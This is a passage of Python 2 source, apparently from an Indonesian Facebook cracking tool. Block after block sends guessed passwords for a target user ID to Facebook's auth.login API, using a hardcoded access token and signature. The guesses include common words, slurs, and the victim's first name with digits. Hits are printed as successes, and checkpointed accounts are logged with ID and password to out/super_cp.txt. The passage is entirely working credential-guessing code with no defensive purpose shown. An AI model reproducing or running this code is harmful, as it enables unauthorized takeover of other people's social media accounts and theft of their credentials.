								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass13 + '\n'
								oks.append(user+pass13)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass13 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass13+"\n")
								cek.close()
								cekpoint.append(user+pass13)
								else:
								pass14 = 'Ambyar'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass14 + '\n'
								oks.append(user+pass14)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass14 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass14+"\n")
								cek.close()
								cekpoint.append(user+pass14)
								else:
								pass15 = 'Santuy'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass15 + '\n'
								oks.append(user+pass15)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass15 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass15+"\n")
								cek.close()
								cekpoint.append(user+pass15)
								else:
								pass16 = 'Persib'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass16)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass16 + '\n'
								oks.append(user+pass16)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass16 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass16+"\n")
								cek.close()
								cekpoint.append(user+pass16)
								else:
								pass17 = 'bangsat'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass17 + '\n'
								oks.append(user+pass17)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass17 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass17+"\n")
								cek.close()
								cekpoint.append(user+pass17)
								else:
								pass18 = 'Goblog'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass18)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass18 + '\n'
								oks.append(user+pass18)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass18 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass18+"\n")
								cek.close()
								cekpoint.append(user+pass18)
								else:
								pass19 = 'Kanjut'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass19)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass19 + '\n'
								oks.append(user+pass19)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass19 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass19+"\n")
								cek.close()
								cekpoint.append(user+pass19)
								else:
								pass20 =b['first_name']
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass20)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass20 + '\n'
								oks.append(user+pass20)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass20 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass20+"\n")
								cek.close()
								cekpoint.append(user+pass20)
								else:
								pass21 = 'Doraemon'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass21)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass21 + '\n'
								oks.append(user+pass21)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass21 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass21+"\n")
								cek.close()
								cekpoint.append(user+pass21)
								else:
								pass22 = 'doraemon'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass22)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass22 + '\n'
								oks.append(user+pass22)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass22 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass22+"\n")
								cek.close()
								cekpoint.append(user+pass22)
								else:
								pass23 =b['first_name']+'123456'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass23)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass23 + '\n'
								oks.append(user+pass23)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass23 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass23+"\n")
								cek.close()
								cekpoint.append(user+pass23)
								else:
								pass24 = '123456'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass24)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass24 + '\n'
								oks.append(user+pass24)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass24 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass24+"\n")
								cek.close()
								cekpoint.append(user+pass24)
								else:
								pass25 = 'anjing'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass25)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass25 + '\n'
								oks.append(user+pass25)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass25 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass25+"\n")
								cek.close()
								cekpoint.append(user+pass25)
								else:
								pass26 = 'Hencet'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass26)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass26 + '\n'
								oks.append(user+pass26)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass26 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass26+"\n")
								cek.close()
								cekpoint.append(user+pass26)
								else:
								pass27 = 'gaming'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass27)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass27 + '\n'
								oks.append(user+pass27)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass27 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass27+"\n")
								cek.close()
								cekpoint.append(user+pass27)
								else:
								pass28 = 'Kata Sandi'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass28)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass28 + '\n'
								oks.append(user+pass28)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass28 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass28+"\n")
								cek.close()
								cekpoint.append(user+pass28)
								else:
								pass29 =b['name']+'123'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass29)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass29 + '\n'
								oks.append(user+pass29)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass29 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass29+"\n")
								cek.close()
								cekpoint.append(user+pass29)
								else:
								pass30 = 'sayang'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass30)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass30 + '\n'
								oks.append(user+pass30)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass30 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass30+"\n")
								cek.close()
								cekpoint.append(user+pass30)
								else:
								pass31 = 'bagong'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass31)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass31 + '\n'
								oks.append(user+pass31)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass31 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass31+"\n")
								cek.close()
								cekpoint.append(user+pass31)
								else:
								pass32 = 'monyet'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass32)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass32 + '\n'
								oks.append(user+pass32)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass32 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass32+"\n")
								cek.close()
								cekpoint.append(user+pass32)
								else:
								pass33 = 'SAYANG'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass33)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass33 + '\n'
								oks.append(user+pass33)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass33 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass33+"\n")
								cek.close()
								cekpoint.append(user+pass33)
								else:
								pass34 = 'Curug7'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass34)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass34 + '\n'
								oks.append(user+pass34)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass34 + '\n'
								cek = open("out/super_cp.txt", "a")
